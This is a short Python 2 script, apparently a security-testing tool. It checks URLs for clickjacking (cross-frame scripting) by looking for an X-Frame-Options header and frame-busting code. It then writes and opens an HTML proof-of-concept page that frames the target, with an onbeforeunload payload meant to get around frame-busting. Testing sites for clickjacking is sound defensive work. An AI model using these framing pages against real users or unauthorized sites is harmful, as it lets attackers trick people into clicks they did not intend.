import webbrowser
import sys
import urllib2
import os
import optparse

parser = optparse.OptionParser('usage:')
parser.add_option('-u','--url', dest='url', type='string', help='Specify single URL' )
parser.add_option('-f','--file', dest='filename', help='list of URLS in a file')

(options,args) = parser.parse_args()

url = options.url
file = options.filename


def repeat(url):

	try:
		new = 1
		req = urllib2.urlopen(url)
		headers = req.info()

		if "X-Frame-Options" in headers:
			print '[-] URL might not be vulnerable to XFS'
			exit(0)

		if "top.location" not in req.read():
			print '[*] URL vulnerable to XFS'
			html = '''
			<html>
			<h1>Clickjacking</h1>
			<body>
			<iframe src="'''+url+'''" height='100%' width='100%'>
			</body>
			</html>'''
			name = "xfs.html"
			fdesc = open(name,"w")
			fdesc.write(html)
			fdesc.close()
			new = new + 1
			webbrowser.open(name, new=new)
			print (html)

		else:
			html = '''
			<h1>XFS: onbeforeunload Payload</h1>
			<script>
		   		window.onbeforeunload = function()
		   	{
		      return "";
		   	}
			</script>
			<iframe src="'''+url+'''" height='100%' width='100%'>'''

			name = "xfs.html"
			fdesc = open(name,"w")
			fdesc.write(html)
			fdesc.close()
			new = new+1
			webbrowser.open(name, new=new)
			print (html)

	except:
		print '[-] ERROR IN TESTING URL:'+url


if (url):
	repeat(url)

if (file):
	fdesc = open(file,'r')
	for url in fdesc:
		repeat(url)

	fdesc.close()
